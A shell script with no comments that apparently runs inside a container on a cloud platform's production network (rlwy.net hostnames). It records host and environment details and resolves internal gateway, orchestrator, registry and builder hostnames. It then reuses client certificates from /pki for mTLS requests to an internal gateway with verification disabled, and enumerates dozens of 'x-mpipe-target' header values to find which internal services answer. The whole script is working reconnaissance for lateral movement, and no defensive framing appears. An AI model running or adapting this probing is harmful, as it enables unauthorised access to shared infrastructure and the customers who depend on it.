#!/bin/sh
set +e
IG=internal-mtls-service-gateway-us-west1.gcp.production.rlwy.net
EG=external-mtls-service-gateway-us-west1.gcp.production.rlwy.net
mkdir -p /r
echo "===MP1==="
echo "--ID--"; hostname; cat /etc/hostname 2>/dev/null; uname -r; id
echo "--RESOLV--"; head -5 /etc/resolv.conf 2>/dev/null
echo "--ENV--"; env | grep -Ei 'MPIPE|OTEL|ORCH|TEMPORAL|RAILWAY|NATS' | sort
echo "--DNS--"
for h in $IG $EG \
 internal-mtls-service-gateway-us-west1.metal.production.rlwy.net \
 external-mtls-service-gateway-us-west1.metal.production.rlwy.net \
 internal-mtls-service-gateway-us-east4.gcp.production.rlwy.net \
 internal-mtls-service-gateway-us-central1.gcp.production.rlwy.net \
 internal-mtls-service-gateway-asia-southeast1.gcp.production.rlwy.net \
 orchestrator.gcp.production.rlwy.net orchestrator.metal.production.rlwy.net \
 registry.gcp.production.rlwy.net temporal.gcp.production.rlwy.net \
 builder-lhmgif.railway.internal ; do
  printf '%s=' "$h"; getent hosts "$h" 2>/dev/null | head -1; echo
done
IGIP=$(getent hosts $IG | awk '{print $1}' | head -1)
EGIP=$(getent hosts $EG | awk '{print $1}' | head -1)
echo "IGIP=$IGIP EGIP=$EGIP"
echo "--TLSIG--"
timeout 8 openssl s_client -connect $IG:443 -servername $IG -alpn h2 -cert /pki/client.crt -key /pki/client.key -CAfile /pki/ca.crt </dev/null 2>/r/tlserr | grep -aE 'ALPN|Verify return|subject=|issuer=|Peer signing' | head -8
echo "--TLSERR--"; head -6 /r/tlserr
printf '\0\0\0\0\0' > /r/req0
EXPORT=/opentelemetry.proto.collector.trace.v1.TraceService/Export
HEALTH=/grpc.health.v1.Health/Check
req() {
  H=$1; T=$2; P=$3; L=$4; shift 4
  : > /r/body; : > /r/hdr
  R=$(curl -sS --http2 -m 8 --connect-timeout 4 -o /r/body -D /r/hdr \
     --cert /pki/client.crt --key /pki/client.key -k "$@" \
     -H "x-mpipe-target: $T" -H 'content-type: application/grpc' -H 'te: trailers' \
     --data-binary @/r/req0 "https://$H$P" -w 'code=%{http_code} size=%{size_download} ip=%{remote_ip}' 2>&1 | tail -1)
  HS=$(grep -aiE '^(HTTP|grpc-status|grpc-message|content-type|server|x-mpipe)' /r/hdr 2>/dev/null | tr -d '\r' | tr '\n' '|')
  B=$(od -An -tx1 /r/body 2>/dev/null | head -2 | tr '\n' ' ')
  echo "R|$L|T=$T|P=$P|$R|$HS|B=$B"
}
echo "--PC--"
req $IG internal_traces $EXPORT PC_IG_EXPORT
req $IG internal_traces $HEALTH PC_IG_HEALTH
req $EG internal_traces $EXPORT PC_EG_EXPORT
req $IG '' $EXPORT PC_IG_NOHEADER
req $IG __nope__ $EXPORT PC_IG_BADTARGET
req $IG internal_traces / PC_IG_ROOT
[ -n "$IGIP" ] && req $IG internal_traces $EXPORT PC_IG_IPRES --resolve "$IG:443:$IGIP"
req 35.247.70.7 internal_traces $EXPORT PC_35247 --resolve "$IG:443:35.247.70.7"
echo "--ENUM--"
for T in internal_traces traces otel otlp collector internal_trace trace \
 internal_orchestrator orchestrator internal-orchestrator internal.orchestrator orchestrator_grpc internal_orchestrator_grpc \
 internal_network_cp network_cp network-cp networkcp internal-network-cp \
 internal_registry registry registry_gcp registry_metal registry-gcp registry-metal internal_registry_gcp internal_registry_metal \
 internal_storage_agent storage_agent storage-agent storageagent internal-storage-agent \
 internal_stacklet stacklet internal_certs certs internal_backboard backboard \
 internal_railyard railyard internal_station station internal_csc csc \
 internal_nats nats internal_builder builder builderv3 internal_builderv3 internal_builder_v3 \
 internal_vm_runner vm_runner vm-runner vmrunner internal-vm-runner \
 internal_temporal temporal internal_edge edge internal_hikari hikari \
 internal_stats stats internal_metrics metrics internal_mpipe mpipe internal_sink sink internal_logs logs ; do
  req $IG $T $HEALTH ENUM
done
echo "--ENUM2_EXPORT--"
for T in internal_traces traces otel otlp internal_orchestrator orchestrator internal_registry registry internal_network_cp network_cp internal_temporal temporal internal_builder builder internal_stats stats internal_vm_runner vm_runner; do
  req $IG $T $EXPORT ENUMX
done
echo "--GETROOT--"
for T in internal_traces __nope__ internal_orchestrator registry; do
  : > /r/body; : > /r/hdr
  R=$(curl -sS --http2 -m 6 --connect-timeout 3 -o /r/body -D /r/hdr --cert /pki/client.crt --key /pki/client.key -k -H "x-mpipe-target: $T" "https://$IG/" -w 'code=%{http_code} size=%{size_download}' 2>&1 | tail -1)
  B=$(head -c 100 /r/body 2>/dev/null | tr -d '\0' | tr '\n\r' '  ')
  echo "G|$T|$R|$B"
done
echo "===MP1END==="
